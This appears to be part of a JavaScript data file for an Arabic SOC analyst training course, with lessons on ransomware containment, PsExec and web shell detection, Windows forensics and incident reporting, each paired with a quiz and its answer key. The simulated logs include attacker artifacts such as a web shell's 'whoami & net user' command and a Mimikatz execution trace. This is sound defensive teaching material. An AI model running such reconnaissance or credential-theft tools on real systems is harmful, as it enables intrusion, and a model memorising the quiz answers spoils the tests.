            "Recipient battery low",
            "Server is fast"
          ],
          correctIndex: 0,
          explanationAr: "بروتوكول SPF يحدد في سجلات DNS عناوين الـ IP الرسمية المخولة بإرسال إيميلات النطاق؛ وظهور `spf=fail` يعني أن الرسالة قادمة من سيرفر خارجي منتحل غير معتمد لدى أصحاب النطاق الأصليين."
        }
      }
,
      {
        id: "lesson-7-7",
        courseId: "course-7",
        number: "7.7",
        titleAr: "Playbook 2 (تحقيق كامل في Malware & Ransomware Outbreak): تحديد المريض صفر (Patient Zero)، تتبع شجرة العمليات، كشف آليات البقاء والاتصال بـ C2، وعزل الجهاز المصاب (Host Isolation)",
        titleEn: "Playbook 2: Malware & Ransomware Outbreak - Patient Zero, Process Trees, Persistence, C2 & Host Isolation",
        duration: "55 min",
        theoryAr: `
<h3>كراسة التحقيق الميداني 2: احتواء طوارئ تفشي برمجيات الفدية والمالوير النشط</h3>
<p class="lead">عندما تطلق أجهزة الحماية تنبيهات تشفير أو انتشار مالوير، كل ثانية تمر تعني تشفير خادم إضافي! هذا الـ Playbook يوضح الخطوات الإنقاذية الصارمة التي ينفذها محلل الـ SOC لاحتواء الكارثة.</p>

<h4>مراحل استجابة الطوارئ لتفشي الفدية (Ransomware Emergency Protocol):</h4>
<ol>
  <li><strong>1. العزل الشبكي الفوري (Host Isolation):</strong>
    <p>أول وأهم إجراء؛ لا تسحب كابل الكهرباء (Pulling the plug) لأن إطفاء الجهاز يمسح الذاكرة العشوائية RAM ويدمر المفاتيح الجنائية! بل قم بتفعيل <strong>العزل الشبكي عبر الـ EDR (Network Containment)</strong> لمنع المالوير من الاتصال بباقي الأجهزة مع إبقاء جلسة الـ EDR متصلة للتحقيق.</p>
  </li>
  <li><strong>2. تحديد المريض صفر (Identifying Patient Zero):</strong>
    <p>البحث في سجلات الـ SIEM عن الجهاز الأول الذي ظهر عليه النشاط الخبيث في المؤسسة؛ معرفة نقطة الدخول الأولى تمنع تكرار الاختراق بعد تنظيف باقي الأجهزة.</p>
  </li>
  <li><strong>3. تشريح شجرة العمليات وآليات البقاء:</strong>
    <p>تحديد العملية الخبيثة الأم، فحص مفاتيح الريجستري والمهام المجدولة التي أنشأتها، وقطع اتصالات الـ C2.</p>
  </li>
  <li><strong>4. منع تشفير الملفات والتحقق من النسخ الاحتياطية (Backups):</strong>
    <p>التحقق الفوري من سلامة خوادم النسخ الاحتياطي المعزولة (Immutable Backups) والتأكد من عدم وصول المهاجم إليها لحذفها.</p>
  </li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي احتواء برمجيات الفدية (Ransomware Containment Lab)</span>
    <h4>تنفيذ عزل فوري للجهاز المصاب وتحديد العملية المسؤولة</h4>
  </div>
  <p>شاهد تنفيذ إجراء العزل السريع للجهاز المشبوه:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> containment-console</div>
    <pre class="terminal-code">[ALERT] Mass File Modification: Process "encryptor.exe" altering 500 files/sec on HR-PC-04!
Executing containment command:
$ edr-cli isolate-host --hostname HR-PC-04 --keep-edr-channel
SUCCESS: Host HR-PC-04 isolated from network. All TCP/UDP traffic blocked except EDR tunnel.
Spread halted successfully: 0 other hosts affected.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('edr-cli isolate-host --hostname HR-PC-04', 'standalone-term-body'); app.showToast('تم عزل الجهاز بنجاح', 'success');">عزل حاسوب HR-PC-04 فوراً</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "أثناء حادثة تفشي برمجية فدية نشطة على أحد أجهزة الشبكة، لماذا يُحظر تماماً سحب كابل الكهرباء وإيقاف تشغيل الجهاز فيزيائياً؟",
          questionEn: "Why is pulling the power plug forbidden during active ransomware containment?",
          optionsAr: [
            "لأن إطفاء الجهاز يمسح الذاكرة العشوائية (RAM) نهائياً، مما يدمر الأدلة الجنائية ومفاتيح فك التشفير المحتمل استخراجها ويمنع أداة EDR من عزل الجهاز والتحقيق فيه",
            "لأن سحب الكابل يزيد من سرعة تشفير الملفات بنسبة 500%",
            "لأن ذلك يعطل شاشات العرض في المبنى المجاور",
            "لأن أسلاك الكهرباء محمية بقفل سري"
          ],
          optionsEn: [
            "Powering off wipes RAM, destroying forensic evidence and potential decryption keys while disconnecting EDR capabilities",
            "Speeds up encryption",
            "Damages neighboring monitors",
            "Power cords are password locked"
          ],
          correctIndex: 0,
          explanationAr: "تحتوي الذاكرة العشوائية RAM على أدلة حاسمة: مفاتيح فك التشفير المحتملة، شجرة العمليات، وعناوين الـ C2؛ فبدلاً من إطفاء الجهاز، يجب عزله شبكياً فقط (Host Isolation) مع إبقائه يعمل لجمع الأدلة الجنائية الحية."
        }
      },
      {
        id: "lesson-7-8",
        courseId: "course-7",
        number: "7.8",
        titleAr: "Playbook 3 (تحقيق كامل في اختراقات الشبكة والـ Active Directory): كشف الحركة الجانبية (Lateral Movement عبر SMB/PsExec/WMI/RDP) وسرقة الصلاحيات",
        titleEn: "Playbook 3: Active Directory Compromise & Lateral Movement Forensics (SMB, PsExec, WMI, RDP)",
        duration: "55 min",
        theoryAr: `
<h3>كراسة التحقيق الميداني 3: ملاحقة التسلل الداخلي وسقوط حراس الدومين</h3>
<p class="lead">بمجرد دخول المهاجم إلى جهاز موظف عادي، يبدأ في "الحركة الجانبية" (Lateral Movement) للقفز من جهاز إلى آخر حتى يصل إلى خوادم الدومين وقواعد البيانات. في هذا الـ Playbook، يتعلم محلل الـ SOC كيفية رصد بصمات أشهر أدوات الحركة الجانبية.</p>

<h4>أشهر أدوات وبروتوكولات الحركة الجانبية وبصماتها في السجلات:</h4>
<ul>
  <li><strong>PsExec (أداة سيسإنترنالز الشرعية المستغلة من الهكر):</strong>
    <p>تتيح تشغيل أوامر عن بُعد على أجهزة أخرى عبر بروتوكول SMB (منفذ 445). بصمتها القاطعة: ظهور مشاركة ملفات ويندوز الإدارية <code>ADMIN$</code> وتثبيت خدمة جديدة باسم <code>PSEXESVC</code> (Event ID 7045) في سجل النظام للجهاز الهدف!</p>
  </li>
  <li><strong>إدارة ويندوز عن بُعد (WMI / WinRM - منافذ 135 و 5985):</strong>
    <p>تنفيذ أوامر دون تثبيت خدمات جديدة؛ بصمتها ظهور عملية <code>WmiPrvSE.exe</code> تطلق عمليات فرعية كـ <code>cmd.exe</code> أو <code>powershell.exe</code> على الجهاز الهدف (Event 4688).</p>
  </li>
  <li><strong>جلسات سطح المكتب البعيد RDP (Event ID 4624 Logon Type 10):</strong>
    <p>تتبع اتصالات RDP المتتالية من جهاز لآخر خلال دقائق معدودة في غير ساعات العمل.</p>
  </li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف هجوم PsExec (Lateral Movement Detection)</span>
    <h4>رصد استدعاء خدمة PSEXESVC في سجل System Event 7045</h4>
  </div>
  <p>تفحص تفاصيل تثبيت خدمة الحركة الجانبية:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> psexec-detector</div>
    <pre class="terminal-code">Log Name: System | Event ID: 7045 | Source: Service Control Manager
Service Name: PSEXESVC
Service File Name: %SystemRoot%\PSEXESVC.exe  <-- PSEXEC SERVICE ARTIFACT!
Service Type: user mode service | Start Type: auto start
Account Name: LocalSystem
[CRITICAL ALERT] Remote execution via PsExec detected traversing from 10.0.4.15 to SRV-DC-01!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "ما هو السجل الأمني القاطع في نظام ويندوز الذي يؤكد لمحلل الـ SOC حدوث حركة جانبية باستخدام أداة PsExec أو أدوات مشابهة تستغل مشاركة ADMIN$؟",
          questionEn: "Which artifact confirms remote lateral execution via PsExec?",
          optionsAr: [
            "ظهور الحدث Event ID 7045 بتثبيت خدمة جديدة تسمى `PSEXESVC` مع اتصال شبكي عبر منفذ SMB 445",
            "انقطاع الكهرباء عن السيرفر",
            "تحديث برنامج فوتوشوب",
            "تغيير صورة سطح المكتب"
          ],
          optionsEn: [
            "Event ID 7045 indicating new service installation of PSEXESVC over SMB 445",
            "Power outage",
            "Photoshop update",
            "Wallpaper changed"
          ],
          correctIndex: 0,
          explanationAr: "تعتمد أداة PsExec في عملها على نسخ ملف تنفيذي ومشاركته عبر SMB ثم تسجيل وتشغيل خدمة مؤقتة تسمى PSEXESVC، وتوليد الحدث 7045 هو البصمة الدامغة لتنفيذ هذه الأداة."
        }
      },
      {
        id: "lesson-7-9",
        courseId: "course-7",
        number: "7.9",
        titleAr: "Playbook 4 (تحقيق كامل في هجمات تطبيقات الويب واختراق السيرفرات): تحليل سجلات الويب لكشف الاستغلال الناجح ورفع الـ Web Shells",
        titleEn: "Playbook 4: Web Application Intrusion - Exploitation Forensics & Web Shell Neutralization",
        duration: "55 min",
        theoryAr: `
<h3>كراسة التحقيق الميداني 4: احتواء اختراق خوادم الويب واستئصال قذائف التحكم</h3>
<p class="lead">خوادم الويب الموجودة في الـ DMZ هي الواجهة الأمامية للمؤسسة؛ عند نجاح مهاجم في استغلال ثغرة رفع ملفات أو حقن أوامر ورفع قذيفة ويب (Web Shell)، يبدأ في استكشاف الشبكة الداخلية. في هذا الـ Playbook، يتعلم المحلل كيفية عزل السيرفر واستئصال الباب الخلفي.</p>

<h4>خطوات التحقيق والاستجابة لاختراق خادم الويب:</h4>
<ol>
  <li><strong>1. تحديد ملف الـ Web Shell ومساره الحقيقي:</strong> فحص سجلات الـ Access Log للبحث عن طلبات HTTP POST غير المعتادة على مجلدات الصور والتحميلات، أو أوامر النظام الممررة في الرابط.</li>
  <li><strong>2. حظر عنوان الـ IP المهاجم على الـ WAF وجدار الحماية:</strong> منع المهاجم فوراً من إرسال أوامر جديدة للسيرفر.</li>
  <li><strong>3. فحص العمليات الفرعية لخادم الويب (Child Processes):</strong> في الوضع الطبيعي، لا تطلق عمليات خادم الويب (مثل <code>w3wp.exe</code> في IIS أو <code>www-data / apache2</code> في لينكس) عمليات سطر أوامر؛ إذا رأيت عملية <code>w3wp.exe</code> أطلقت <code>cmd.exe</code> أو <code>powershell.exe</code> فهذا دليل قاطع على تنفيذ أوامر عبر قذيفة الويب!</li>
  <li><strong>4. استئصال الملف وترقية الثغرة (Remediation):</strong> حفظ نسخة من ملف الـ Web Shell كدليل جنائي، ثم حذفه، وسد الثغرة البرمجية في كود الموقع.</li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تشريح قذيفة الويب في IIS (Web Shell Hunter)</span>
    <h4>كشف عملية w3wp.exe تطلق موجه الأوامر cmd.exe</h4>
  </div>
  <p>تفحص شجرة العمليات الملتقطة في الحدث 4688 على خادم الويب IIS:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> iis-process-hunter</div>
    <pre class="terminal-code">Creator Process Name: C:\Windows\System32\inetsrv\w3wp.exe  <-- IIS WEB WORKER PROCESS!
New Process Name:     C:\Windows\System32\cmd.exe           <-- ABNORMAL CHILD SHELL!
Process Command Line: "cmd.exe" /c whoami & net user
[CRITICAL ALERT] Web Shell Active Exploitation: IIS worker spawned interactive shell!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في خوادم ويندوز التي تشغل خادم الويب IIS، ما الذي يدل عليه ظهور عملية `w3wp.exe` وهي تطلق عملية فرعية لسطر الأوامر `cmd.exe` أو `powershell.exe`؟",
          questionEn: "What does IIS w3wp.exe spawning cmd.exe indicate?",
          optionsAr: [
            "دليل مؤكد على وجود قذيفة ويب خبيثة (Web Shell) تم رفعها ويتم استغلالها لتنفيذ أوامر على نظام التشغيل",
            "سلوك طبيعي يقوم به ويندوز لضغط ملفات الصور",
            "المتصفح يقوم بمسح ملفات الكاش",
            "خادم الويب متوقف عن العمل"
          ],
          optionsEn: [
            "Definitive evidence of an active web shell executing arbitrary OS commands via web requests",
            "Normal image compression",
            "Browser clearing cache",
            "Server offline"
          ],
          correctIndex: 0,
          explanationAr: "عملية `w3wp.exe` مسؤولة عن معالجة طلبات الويب فقط، ولا يجب أبداً أن تطلق موجه أوامر النظام (cmd أو PowerShell)؛ فإذا حدث ذلك، فهو التوقيع السلوكي الكلاسيكي لتنفيذ أوامر عبر Web Shell."
        }
      },
      {
        id: "lesson-7-10",
        courseId: "course-7",
        number: "7.10",
        titleAr: "التحقيق الجنائي الرقمي الأساسي (DFIR & Memory Forensics): أهم الأدلة الجنائية في ويندوز (Prefetch, Shimcache, Amcache, LNK, Event Logs) وتحليل الذاكرة بـ Volatility",
        titleEn: "Basic DFIR & Memory Forensics: Windows Artifacts (Prefetch, Amcache, LNK) & Volatility Analysis",
        duration: "55 min",
        theoryAr: `
<h3>علم الآثار السيبراني: كيف تستخرج الأدلة التي ظن المهاجم أنه مسحها؟</h3>
<p class="lead">عندما يحذف المهاجم ملفاته وسجلاته، يظن أنه انتصر؛ لكن نظام ويندوز مصمم ليحتفظ بآثار تنفيذ البرامج في زوايا خفية في عمق القرص والذاكرة. هنا يتدخل محقق الجرائم الرقمية (DFIR).</p>

<h4>أهم الأدلة الجنائية الصامتة في ويندوز (Windows Forensic Artifacts):</h4>
<ul>
  <li><strong>ملفات التسريع المسبق (Prefetch Files - <code>.pf</code>):</strong>
    <p>ميزة في ويندوز لتسريع تشغيل البرامج، تحفظ ملفاً في <code>C:\Windows\Prefetch</code> لكل برنامج تم تشغيله على الجهاز. يسجل الملف: اسم البرنامج، مساره الكامل، عدد مرات تشغيله، وتاريخ آخر 8 مرات تم تشغيله فيها! حتى لو حذف المهاجم برنامجه الخبيث، يثبت ملف الـ Prefetch أنه تم تشغيله وتاريخ ذلك بالثانية!</p>
  </li>
  <li><strong>قاعدة Shimcache (AppCompatCache) و Amcache:</strong>
    <p>تخزن معلومات عن كل ملف تنفيذي تم لمسه أو تشغيله على الجهاز لضمان توافق البرامج، مع الهاش الكامل SHA1 للملف وحجمه ومساره وتاريخ إنشائه.</p>
  </li>
  <li><strong>ملفات الاختصارات (LNK Files) وقوائم القفز (Jump Lists):</strong>
    <p>تثبت فتح واستعراض المستخدم أو المهاجم لملفات ومجلدات معينة، حتى لو كانت مخزنة على وحدة USB تمت إزالتها لاحقاً!</p>
  </li>
</ul>

<h4>التحقيق الجنائي في الذاكرة العشوائية بواسطة أداة Volatility (Memory Forensics):</h4>
<p>الذاكرة العشوائية (RAM Dump) هي المنجم الذهبي للتحقيق الجنائي؛ تتيح أداة <strong>Volatility</strong> فحص الذاكرة لكشف:</p>
<ul>
  <li><code>windows.pslist / pstree:</code> استعراض شجرة العمليات التي كانت تعمل في الذاكرة لحظة التقاط العينة (حتى العمليات المخفية بتقنيات Rootkits!).</li>
  <li><code>windows.netscan:</code> استعراض اتصالات الشبكة النشطة والمنافذ التي كانت مفتوحة لحظة التجميد.</li>
  <li><code>windows.malfind:</code> فحص واستخراج الأكواد المحقونة في الذاكرة والـ Shellcodes المشبوهة.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص ملفات Prefetch (Prefetch Forensics Lab)</span>
    <h4>إثبات تشغيل أداة Mimikatz المحذوفة عبر فحص ملف الـ .pf</h4>
  </div>
  <p>تفحص مخرجات تحليل ملف الـ Prefetch المستخرج من خادم مخترق:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> prefetch-dissector</div>
    <pre class="terminal-code">Executable Name: MIMIKATZ.EXE-24B89A01.pf
Full Path:       C:\Users\Public\Downloads\mimikatz.exe
Run Count:       3 times
Last Executed:   2026-11-07 05:14:02 UTC
Previous Runs:   2026-11-07 05:12:10 UTC, 2026-11-07 05:10:00 UTC
[FORENSIC EVIDENCE CONFIRMED]: Executable was executed 3 times despite being wiped from disk!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في التحقيق الجنائي الرقمي لنظام ويندوز، ما هي المعلومة الحاسمة التي يوفرها فحص ملفات الـ Prefetch (`.pf`) للمحقق الأمني حتى بعد قيام المهاجم بحذف الملف الخبيث من القرص؟",
          questionEn: "What critical evidence do Windows Prefetch files provide even after malware deletion?",
          optionsAr: [
            "تثبت بشكل قاطع أن البرنامج تم تشغيله على الجهاز بالفعل، مع توثيق مساره الكامل وتاريخ تشغيله الدقيق وعدد مرات التشغيل",
            "تعرض صورة لشاشة الحاسوب بدقة 4K",
            "تقوم بإصلاح شاشة الحاسوب المكسورة",
            "تحذف سجلات النظام القديمة"
          ],
          optionsEn: [
            "Conclusive proof that the binary was indeed executed, recording full path, exact execution timestamp and run count",
            "4K screenshots",
            "Hardware repair",
            "Deletes system logs"
          ],
          correctIndex: 0,
          explanationAr: "ملفات Prefetch هي الدليل الدامغ على تنفيذ البرامج (Evidence of Execution)؛ فتحتفظ بسجلات وتواريخ تشغيل البرنامج حتى لو قام المهاجم بمسح الملف التنفيذي الأصلي من القرص بعد انتهاء هجومه."
        }
      },
      {
        id: "lesson-7-11",
        courseId: "course-7",
        number: "7.11",
        titleAr: "دورة حياة الاستجابة للحوادث (NIST & SANS PICERL) وكيف تكتب تقرير حادث أمني رسمي واحترافي (Incident Report & Escalation Ticket)",
        titleEn: "Incident Response Lifecycle (NIST SP 800-61 & SANS PICERL) & Professional Incident Report Writing",
        duration: "55 min",
        theoryAr: `
<h3>علم إدارة الأزمات السيبرانية: كيف تصيغ التقارير الاحترافية التي تقرأها الإدارة العليا؟</h3>
<p class="lead">لا تكتمل مهارة محلل الـ SOC بمجرد كشف الاختراق تقنياً؛ فالمهارة التي ترفعك في سلم الترقيات هي قدرتك على توثيق الحادثة وتقديم <strong>تقرير رسمي واحترافي (Executive & Technical Incident Report)</strong> يوضح الحقائق بلغة واضحة خالية من التكهنات.</p>

<h4>دورة حياة الاستجابة للحوادث وفق معايير SANS PICERL:</h4>
<ol>
  <li><strong>1. الإعداد والجاهزية (Preparation):</strong> تدريب الفريق، تجهيز الأدوات وكراسات التشغيل، والنسخ الاحتياطية.</li>
  <li><strong>2. الاكتشاف والتعرف (Identification):</strong> رصد التنبيه وتحديد نطاق الحادثة والأصول المتضررة.</li>
  <li><strong>3. الاحتواء (Containment):</strong> عزل الأنظمة المتأثرة لمنع تفشي الهجوم (Short-term & Long-term).</li>
  <li><strong>4. الاستئصال (Eradication):</strong> حذف البرمجيات الخبيثة، سد الثغرات، وإلغاء حسابات الباب الخلفي.</li>
  <li><strong>5. التعافي واستعادة العمليات (Recovery):</strong> استعادة الأنظمة من نسخ احتياطية نظيفة ومراقبتها بحذر للتأكد من زوال الخطر.</li>
  <li><strong>6. الدروس المستفادة (Lessons Learned):</strong> اجتماع مراجعة الحادثة لتحديث السياسات ومنع تكرار الثغرة.</li>
</ol>

<h4>الهيكل القياسي لتقرير الحادث الأمني الرسمي (Incident Report Structure):</h4>
<ul>
  <li><strong>الملخص التنفيذي (Executive Summary):</strong> فقرة موجزة موجهة للمدير التنفيذي (CISO / CEO) توضح ما حدث، الأثر المالي أو التشغيلي، والإجراءات المتخذة بلغة أعمال خالية من التعقيد البرمجي.</li>
  <li><strong>التسلسل الزمني للحادثة (Incident Timeline):</strong> جدول دقيق يوثق التوقيت بالـ UTC من لحظة التسلل حتى الاحتواء.</li>
  <li><strong>التحليل الفني المعمق (Technical Findings):</strong> الأدلة المستخرجة، المؤشرات الجنائية (IOCs)، وأكواد السجلات.</li>
  <li><strong>التوصيات العلاجية الوقائية (Actionable Recommendations):</strong> خطوات محددة لتعزيز الحماية مستقبلاً.</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كتابة التقارير الرسمية (Incident Report Builder)</span>
    <h4>مراجعة تقرير حادثة رسمية معتمدة وفق المعايير العالمية</h4>
  </div>
  <p>تفحص التقرير النهائي للحادثة الجنائية الصادر عن منصة الأكاديمية:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> incident-report-view</div>
    <pre class="terminal-code">=== BASHARSEC OFFICIAL INCIDENT REPORT ===
INCIDENT ID:      INC-2026-BH-0042
SEVERITY LEVEL:   HIGH (Sev-2)
STATUS:           CONTAINED & RESOLVED
INCIDENT TYPE:    Ransomware Outbreak Attempt via Phishing
EXECUTIVE SUMMARY:
On Nov 7, 2026, an external spearphishing email delivered a malicious document to HR-PC-04.
The host was successfully isolated via EDR within 12 minutes of execution. No corporate data
was encrypted or exfiltrated. All C2 IPs permanently blocked on perimeter firewalls.
RECOMMENDATION: Enforce macro disabling in corporate GPO; conduct staff phishing simulation.</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في كتابة تقارير الحوادث الأمنية الرسمية، ما هو الغرض الأساسي من قسم 'الملخص التنفيذي' (Executive Summary)؟",
          questionEn: "What is the primary purpose of the Executive Summary in an Incident Report?",
          optionsAr: [
            "تقديم ملخص عالي المستوى للإدارة التنفيذية وصناع القرار يشرح طبيعة الحادثة وأثرها التجاري والإجراءات المتخذة بلغة أعمال واضحة دون إغراقهم بالتفاصيل البرمجية المعقدة",
            "إخفاء هوية المهاجم عن الشرطة",
            "عرض قائمة بأسماء جميع أجهزة الحواسيب بالشركة",
            "كتابة شفرات برمجية بلغة C++"
          ],
          optionsEn: [
            "Provide high-level context to executives explaining business impact and actions taken without deep technical jargon",
            "Hide attacker identity",
            "List all computers",
            "Write C++ code"
          ],
          correctIndex: 0,
          explanationAr: "الملخص التنفيذي موجه للإدارة العليا (CISO و CEO ومجلس الإدارة) الذين يحتاجون لمعرفة الأثر التشغيلي والقانوني والمالي للحادثة وكيف تم احتواؤها دون الحاجة لقراءة آلاف أسطر سجلات السداسية والـ Hex."
        }
      },
      {
        id: "lesson-7-12",
        courseId: "course-7",
        number: "7.12",
        titleAr: "بناء المختبر المنزلي المتكامل (Home Lab) + الدليل الذهبي لاجتياز مقابلات عمل SOC Analyst Tier 1 & Tier 2 (أهم 50 سؤالاً وجواباً تفصيلياً)",
        titleEn: "Enterprise SOC Home Lab Setup & The Ultimate SOC Tier 1/2 Job Interview Guide (Top 50 Q&As)",
        duration: "60 min",
        theoryAr: `
<h3>بوابة التوظيف الحقيقية: كيف تبني مختبرك المنزلي وتجتاز مقابلات العمل بجدارة؟</h3>
<p class="lead">الشهادات النظرية وحدها لا تكفي؛ ما يميزك في سوق العمل العالمي ويبهر مديري التوظيف هو أن تقول في المقابلة: <em>"لقد بنيت مختبر SOC متكاملاً في منزلي، وجمعت سجلات Active Directory عبر Wazuh و Splunk وحاكيت هجمات واقعية بنفسي!"</em>.</p>

<h4>1. خريطة بناء مختبر الـ SOC المنزلي الاحترافي (Free SOC Home Lab):</h4>
<ul>
  <li><strong>برنامج البيئات الافتراضية (Hypervisor):</strong> برنامج VMware Workstation Player أو VirtualBox أو Proxmox.</li>
  <li><strong>خادم الدومين (Windows Server):</strong> نسخة تجريبية رسمية مجانية لمدة 180 يوماً من Windows Server 2022 لتثبيت Active Directory.</li>
  <li><strong>حاسوب الضحية (Windows 10/11 Endpoint):</strong> حاسوب عميل متصل بالدومين ومثبت عليه أداة <strong>Sysmon</strong> لتوليد السجلات السلوكية.</li>
  <li><strong>منظومة الـ SIEM & XDR (Wazuh / Splunk):</strong> توزيعة Ubuntu Server تشغل Wazuh All-in-One أو Splunk Enterprise (رخصة مجانية 500MB يومياً تكفي للمختبر تماماً).</li>
  <li><strong>محاكي الهجمات (Attack Simulation):</strong> توزيعة Kali Linux لتنفيذ هجمات Nmap و Kerberoasting و Password Spraying لاختبار قدرة مختبرك على إطلاق التنبيهات!</li>
</ul>

<h4>2. أهم محاور أسئلة المقابلات الوظيفية لمحلل SOC Tier 1 & 2:</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>سؤال المقابلة الكلاسيكي</th>
        <th>الإجابة الذهبية النموذجية للمحلل المحترف</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>ما هي خطواتك عند رصد تنبيه اتصال بـ C2 خارجي؟</strong></td>
        <td>1. التحقق من صحة التنبيه وسمعة الـ IP في OSINT. 2. عزل الحاسوب المصاب شبكياً فوراً عبر EDR لمنع انتشار الهجوم. 3. فحص شجرة العمليات لتحديد الملف الخبيث وتوقيته. 4. البحث في الـ SIEM عن أي أجهزة أخرى اتصلت بنفس الـ IP. 5. حظر الـ IP في الفايروول وتصعيد التذكرة.</td>
      </tr>
      <tr>
        <td><strong>ما الفرق بين Event ID 4624 Logon Type 2 و Type 3 و Type 10؟</strong></td>
        <td>Type 2 هو دخول فيزيائي مباشر بلوحة المفاتيح. Type 3 هو دخول عبر الشبكة لمشاركة ملفات SMB (شائع في Pass-the-Hash). Type 10 هو دخول تفاعلي عن بُعد عبر بروتوكول RDP.</td>
      </tr>
      <tr>
        <td><strong>كيف تفرق بين Brute Force و Password Spraying؟</strong></td>
        <td>Brute Force يجرب آلاف الكلمات على حساب واحد ويؤدي لإغلاقه. Password Spraying يجرب كلمة واحدة شائعة على آلاف الحسابات ببطء لتفادي قفل الحسابات.</td>
      </tr>
      <tr>
        <td><strong>ما هو هجوم Kerberoasting وكيف تكشفه؟</strong></td>
        <td>طلب تذاكر خدمات TGS لحسابات SPN واستخراجها لكسرها خارجياً بالـ GPU؛ ونكشفه عبر رصد Event 4769 بنوع تشفير قديم 0x17 (RC4).</td>
      </tr>
    </tbody>
  </table>
</div>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي المقابلات الوظيفية التفاعلي (SOC Mock Interview Lab)</span>
    <h4>اختبار سيناريو المقابلة الفنية المباشرة لفرز تنبيه حرج</h4>
  </div>
  <p>أمامك مدير مركز العمليات الأمنية يطرح عليك سيناريو المقابلة الفاصل:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> interview-mock-challenge</div>
    <pre class="terminal-code">INTERVIEWER SCENARIO:
"You see an alert: Workstation-02 initiated 1,500 SMB connections to all domain endpoints in 3 minutes, followed by Event 7045 PSEXESVC on the Domain Controller. What happened, and what are your immediate 3 steps?"
CORRECT RESPONSE SEQUENCE:
1. Lateral Movement attempt via PsExec/SMB spreading across subnet.
2. Immediate Host Isolation of Workstation-02 via EDR.
3. Terminate PSEXESVC on DC, inspect DC integrity, and rotate Domain Admin credentials.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('interview-answer --psexec-lateral-movement', 'standalone-term-body'); app.showToast('تم تقييم الإجابة: امتياز وتفوق فني كامل!', 'success');">تقديم الإجابة النموذجية للمقابلة</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في مقابلة عمل لوظيفة محلل SOC Tier 1، عندما يسألك مدير الـ SOC: 'ما هو أول إجراء تتخذه فور التأكد من وجود برمجية فدية نشطة تقوم بتشفير الملفات على حاسوب متصل بالشبكة؟'، ما هي الإجابة النموذجية؟",
          questionEn: "In a SOC interview: what is the immediate first step upon confirming active ransomware?",
          optionsAr: [
            "العزل الشبكي الفوري للحاسوب المصاب (Host Isolation via EDR) لمنع انتشار الفدية للأجهزة والخوادم الأخرى بالشبكة، مع إبقاء الجهاز يعمل دون إطفائه لحفظ الذاكرة العشوائية RAM للأدلة الجنائية",
            "سحب كابل الكهرباء وإلقاء الجهاز من النافذة",
            "إعادة تشغيل الجهاز 5 مرات متتالية",
            "إغلاق الشاشة والذهاب للغداء"
          ],
          optionsEn: [
            "Immediate Host Isolation via EDR to prevent lateral spread, keeping the machine powered on to preserve RAM forensics",
            "Pulling the plug and throwing the PC",
            "Rebooting 5 times",
            "Going to lunch"
          ],
          correctIndex: 0,
          explanationAr: "العزل الشبكي الفوري (Network Containment / Host Isolation) هو الإجابة المثالية التي يبحث عنها كل مدير SOC؛ فهو يمنع الكارثة من الانتشار فوراً مع الحفاظ على سلامة الأدلة الجنائية في الذاكرة العشوائية."
        }
      }
    ]
  }
];
